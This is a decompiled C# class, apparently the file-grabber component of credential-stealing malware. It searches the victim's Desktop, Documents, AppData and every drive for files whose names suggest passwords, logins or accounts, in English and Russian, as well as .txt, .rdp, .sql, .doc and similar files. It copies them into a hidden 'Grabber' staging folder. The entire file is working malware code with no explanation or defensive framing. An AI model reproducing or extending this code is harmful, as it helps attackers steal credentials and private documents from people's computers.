using System;
using System.IO;

// Token: 0x0200000C RID: 12
internal class DFiles
{
	// Token: 0x0600001B RID: 27 RVA: 0x00003770 File Offset: 0x00001970
	protected static void SearchFiles(string dir, string _path)
	{
		bool flag = false;
		string[] array = new string[]
		{
			".txt",
			".rtf",
			".log",
			".doc",
			".docx",
			".rdp",
			".sql"
		};
		FileInfo[] files = new DirectoryInfo(dir).GetFiles();
		if (files.Length != 0)
		{
			FileInfo[] array2 = files;
			int i = 0;
			while (i < array2.Length)
			{
				FileInfo fileInfo = array2[i];
				string text = fileInfo.Extension.ToLower();
				string text2 = fileInfo.Name.ToLower().Substring(0, fileInfo.Name.Length - text.Length);
				if (text2.Contains("password") || text2.Contains("login") || text2.Contains("account") || text2.Contains("аккаунт") || text2.Contains("парол") || text2.Contains("вход") || text2.Contains("важно") || text2.Contains("сайта") || text2.Contains("site"))
				{
					try
					{
						if (fileInfo.Length > 50000L)
						{
							goto IL_1BD;
						}
						if (!flag && !Directory.Exists(_path))
						{
							Directory.CreateDirectory(_path);
							flag = true;
						}
						fileInfo.CopyTo(_path + "\\" + fileInfo.Name);
						goto IL_1BD;
					}
					catch
					{
						goto IL_1BD;
					}
					goto IL_160;
				}
				goto IL_160;
				IL_1BD:
				i++;
				continue;
				IL_160:
				foreach (string a in array)
				{
					try
					{
						if (!(a != text))
						{
							if (!flag && !Directory.Exists(_path))
							{
								Directory.CreateDirectory(_path);
								flag = true;
							}
							fileInfo.CopyTo(_path + "\\" + fileInfo.Name);
							break;
						}
					}
					catch
					{
					}
				}
				goto IL_1BD;
			}
		}
	}

	// Token: 0x0600001C RID: 28 RVA: 0x00003968 File Offset: 0x00001B68
	public static void Start()
	{
		try
		{
			if (!Directory.Exists(DFiles.path))
			{
				Directory.CreateDirectory(DFiles.path);
			}
			string dir = null;
			string[] array = null;
			string dir2 = null;
			string[] array2 = null;
			string dir3 = null;
			string[] array3 = null;
			string dir4 = null;
			string[] array4 = null;
			try
			{
				dir = global::Buffer.path_dp;
			}
			catch
			{
			}
			try
			{
				dir2 = global::Buffer.path_ds;
			}
			catch
			{
			}
			try
			{
				dir3 = global::Buffer.path_ad;
			}
			catch
			{
			}
			try
			{
				dir4 = global::Buffer.path_lad;
			}
			catch
			{
			}
			try
			{
				DFiles.SearchFiles(dir, DFiles.path + "\\Desktop Files");
				array = Directory.GetDirectories(dir);
			}
			catch
			{
			}
			try
			{
				DFiles.SearchFiles(dir2, DFiles.path + "\\Documents Files");
				array2 = Directory.GetDirectories(dir2);
			}
			catch
			{
			}
			try
			{
				DFiles.SearchFiles(dir3, DFiles.path + "\\AppData Files");
				array3 = Directory.GetDirectories(dir3);
			}
			catch
			{
			}
			try
			{
				DFiles.SearchFiles(dir4, DFiles.path + "\\LocalAppData Files");
				array4 = Directory.GetDirectories(dir4);
			}
			catch
			{
			}
			if (array.Length != 0)
			{
				string[] array5 = array;
				for (int i = 0; i < array5.Length; i++)
				{
					DFiles.SearchFiles(array5[i], DFiles.path + "\\Disks Files");
				}
			}
			if (array2.Length != 0)
			{
				string[] array6 = array2;
				for (int j = 0; j < array6.Length; j++)
				{
					DFiles.SearchFiles(array6[j], DFiles.path + "\\Disks Files");
				}
			}
			if (array3.Length != 0)
			{
				string[] array7 = array3;
				for (int k = 0; k < array7.Length; k++)
				{
					DFiles.SearchFiles(array7[k], DFiles.path + "\\Disks Files");
				}
			}
			if (array4.Length != 0)
			{
				string[] array8 = array4;
				for (int l = 0; l < array8.Length; l++)
				{
					DFiles.SearchFiles(array8[l], DFiles.path + "\\Disks Files");
				}
			}
			foreach (string dir5 in Environment.GetLogicalDrives())
			{
				try
				{
					DFiles.SearchFiles(dir5, DFiles.path + "\\Disks Files");
				}
				catch
				{
				}
				try
				{
					string[] directories = Directory.GetDirectories(dir5);
					if (directories.Length != 0)
					{
						foreach (string dir6 in directories)
						{
							try
							{
								string a = Path.GetDirectoryName(dir6).ToLower();
								if (!(a == "windows") && !(a == "programdata") && !(a == "program files (x86)") && !(a == "program files") && !(a == "пользователи") && !(a == "users") && !(a == "perflogs"))
								{
									DFiles.SearchFiles(dir6, DFiles.path + "\\Disks Files");
								}
							}
							catch
							{
							}
						}
					}
				}
				catch
				{
				}
			}
			int num = Directory.GetDirectories(DFiles.path).Length;
		}
		catch
		{
		}
	}

	// Token: 0x04000006 RID: 6
	protected static string path = string.Format("{0}Grabber", global::Buffer.path_l);
}
